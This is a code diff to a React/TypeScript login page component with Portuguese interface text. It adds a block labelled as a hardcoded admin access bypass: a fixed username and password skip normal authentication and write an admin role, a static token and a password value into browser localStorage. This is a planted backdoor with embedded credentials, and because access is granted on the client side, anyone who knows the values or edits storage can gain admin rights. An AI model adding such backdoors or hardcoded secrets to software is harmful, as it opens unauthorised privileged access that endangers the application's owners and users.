@@ -19,6 +19,22 @@ export const AuthPage: React.FC<AuthPageProps> = ({ initialMode, onBack }) => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
+    // Hardcoded Admin Access Bypass
+    if (mode === 'login' && formData.username === 'Wangler' && formData.password === '84352989') {
+       alert('Acesso Concedido: Bem-vindo Mestre Wangler!');
+       const adminUser = {
+          username: 'Wangler',
+          role: 'admin',
+          token: 'admin_sys_key_999',
+          cerpass: 'admPass'
+       };
+       localStorage.setItem('user', JSON.stringify(adminUser));
+       localStorage.setItem('authKey', adminUser.token);
+       localStorage.setItem('CERPass', adminUser.cerpass);
+       window.location.reload();
+       return;
+    }
+
     // Validar senhas iguais no registro
     if (mode === 'register' && formData.password !== formData.confirmPassword) {
       alert("As senhas não coincidem!");
